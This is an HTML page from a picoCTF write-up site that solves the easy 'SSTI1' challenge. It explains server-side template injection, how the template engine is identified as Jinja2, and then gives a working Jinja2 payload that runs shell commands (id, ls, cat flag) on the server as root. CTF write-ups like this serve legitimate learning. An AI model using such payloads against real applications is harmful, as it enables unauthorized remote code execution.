<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Web Exploitation – Easy</title>
  <link rel="stylesheet" href="../css/writeup.css">

</head>

<body>
  <div class="writeup-layout">

    <!-- ===== SIDEBAR ===== -->
    <aside class="sidebar">
      <h2>Web Exploitation</h2>
      <h3><a href="../WebExDesc.html">Web Exploitation Overview</a>
</h3>
      <details open>
  <summary>Easy Challenges</summary>
  <ul>
    <li><a href="Crack_the_Gate_1.html">Crack the Gate 1</a></li>
    <li><a href="SSTI1.html">SSTI1</a></li>
    <li><a href="coming_soon.html">n0s4n1ty 1</a></li>
    <li><a href="Cookie_Monster.html">Cookie Monster Secret Recipe</a></li>
    <li><a href="Web_Decoder.html">WebDecode</a></li>
    <li><a href="Unminify.html">Unminify</a></li>
    <li><a href="introtoburpsuite.html">IntroToBurp</a></li>
    <li><a href="Bookmarklet.html">Bookmarklet</a></li>
    <li><a href="Local_Authority.html">Local Authority</a></li>
    <li><a href="Inspect_HTML.html">Inspect HTML</a></li>
    <li><a href="Includes.html">Includes</a></li>
    <li><a href="Cookie.html">Cookies</a></li>
    <li><a href="Scavenger_Hunt.html">Scavenger Hunt</a></li>
    <li><a href="Get_aHead.html">GET aHEAD</a></li>
    <li><a href="dont_use_client_side.html">dont-use-client-side</a></li>
    <li><a href="logon.html">logon</a></li>
    <li><a href="Insp3ct0r.html">Insp3ct0r</a></li>
    <li><a href="where_are_the_robots.html">where are the robots</a></li>
  </ul>
</details>

    <details closed>
  <summary>Medium Challenges</summary>
  <ul>
    <li><a href="../Medium/Crack_the_Gate_2.html">Crack the Gate 2</a></li>
    <li><a href="">byp4ss3d</a></li>
    <li><a href="">Pachinko</a></li>
    <li><a href="">SSTI 2</a></li>
    <li><a href="../Medium/3v@l.html">3v@l</a></li>
    <li><a href="">WebSockFish</a></li>
    <li><a href="">ApritiSesamo</a></li>
    <li><a href="">Trickster</a></li>
    <li><a href="../Medium/No_SQL_Injection.html">No Sql Injection</a></li>
    <li><a href="">SOAP</a></li>
    <li><a href="../Medium/More_SQLi.html">More SQLi</a></li>
    <li><a href="../Medium/MatchTheRegex.html">MatchTheRegex</a></li>
    <li><a href="">Java Code Analysis!?!</a></li>
    <li><a href="">findme</a></li>
    <li><a href="">SQLiLite</a></li>
    <li><a href="">SQL Direct</a></li>
    <li><a href="../Medium/Secrets.html">Secrets</a></li>
    <li><a href="">Search Source</a></li>
    <li><a href="../Medium/Roboto_Sans.html">Roboto Sans</a></li>
    <li><a href="../Medium/Power_Cookie.html">Power Cookie</a></li>
    <li><a href="../Medium/Forbidden_Paths.html">Forbidden Paths</a></li>
    <li><a href="">JAuth</a></li>
    <li><a href="">caas</a></li>
    <li><a href="">login</a></li>
    <li><a href="SuperSerial.html">Super Serial</a></li>
    <li><a href="">Most Cookies</a></li>
    <li><a href="">Web Gauntlet 2</a></li>
    <li><a href="">Some Assembly Required 1</a></li>
    <li><a href="">Who are you?</a></li>
    <li><a href="">Some Assembly Required 2</a></li>
    <li><a href="">Web Gauntlet 3</a></li>
    <li><a href="">More Cookies</a></li>
    <li><a href="">It is my Birthday</a></li>
    <li><a href="">Startup Company</a></li>
    <li><a href="">Web Gauntlet</a></li>
    <li><a href="../Medium/Irish-Name-Repo_1.html">Irish-Name-Repo 1</a></li>
    <li><a href="../Medium/Irish-Name-Repo_2.html">Irish-Name-Repo 2</a></li>
    <li><a href="">Irish-Name-Repo 3</a></li>
    <li><a href="">Client-side-again</a></li>
    <li><a href="">picobrowser</a></li>
  </ul>
</details>

    <details closed>
  <summary>Hard Challenges</summary>
  <ul>
    <li><a href="">secure-email-service</a></li>
    <li><a href="">Pachinko Revisited</a></li>
    <li><a href="">elements</a></li>
    <li><a href="">msfroggenerator2</a></li>
    <li><a href="">cancri-sp</a></li>
    <li><a href="">noted</a></li>
    <li><a href="">Live Art</a></li>
    <li><a href="">notepad</a></li>
    <li><a href="">Bithug</a></li>
    <li><a href="">X marks the spot</a></li>
    <li><a href="">Some Assembly Required 3</a></li>
    <li><a href="">Some Assembly Required 4</a></li>
    <li><a href="">Java Script Kiddie</a></li>
    <li><a href="">Java Script Kiddie 2</a></li>
  </ul>
</details>

      <a class="back-home" href="../../index.html">← Back to Index</a>
    </aside>

    <!-- ===== CONTENT ===== -->
    <main class="content">
      <section id="challenge1">
        <h1>SSTI (Easy)</h1>
        <ul>
          <li>Challenge Link: https://play.picoctf.org/practice/challenge/492?assigned=0&bookmarked=0&category=1&page=1&solved=0</li>
          <li>Challenge Description: I made a cool website where you can announce whatever you want! Try it out!</li>
        </ul>
      </section>

      <section>
        <h1>Solution</h1>
        <p>The challenge brings you to a website where you can input anything you want into the dialogue box then clicking the ‘Ok’ button will broadcast it on your webpage. With no prior knowledge on web exploitation, the hint suggests using server side template injection. By doing some research, a server side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. This happens when a user input is concatenated into templates rather than being passed in as data. In order to identify the vulnerability, we start by inputting special characters like ${{&lt;%[%'"}}%\ and clicking the ‘Ok’ button will let us know how the server interprets these characters. Using the chart below, we can identify what template the server uses:</p>
        <img src="../Images/SSTI 1/serverside.png" alt="templates">
        <p>Let's try:</p>
        <pre>${7*7}</pre>
        <img src="../Images/SSTI 1/output.jpg" alt="output">
        <p>Since it returned what we just entered, we can now try:</p>\
        <pre>{{7*7}}</pre>
        <img src="../Images/SSTI 1/output2.jpg" alt="Twig">
        <p>We get 49, so it may be using Twig, so let's try another one to confirm:</p>
        <pre>{{7*'7'}}</pre>
        <img src="../Images/SSTI 1/output3.jpg" alt="Jinja2">
        <p>We confirmed that it is using Jinja2, using a RCE payload from onsecurity (check sources), let's try to get the flag:</p>
        <pre>{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}</pre>
        <img src="../Images/SSTI 1/root.jpg" alt="root">
        <p>Not a flag, but now we know that we are running as root, so whatever input we put in (in Jinja) will execute on the server as root. Replace id with ls to see any files present on the server.</p>
        <pre>{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}</pre>
        <img src="../Images/SSTI 1/ls.jpg" alt="ls">
        <p>Now we can read the flag file by using cat:</p>
        <pre>{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}</pre>
        <img src="../Images/SSTI 1/cat.jpg" alt="cat">
      </section>

      <section>
        <h1>Sources</h1>
        <ul>
          <li><a href="https://onsecurity.io/article/server-side-template-injection-with-jinja2/">onsecurity - SSTI</a></li>
          <li><a href="https://portswigger.net/web-security/server-side-template-injection">Portswigger - SSTI</a></li>
        </ul>
      </section>

    </main>
  </div>
</body>
</html>
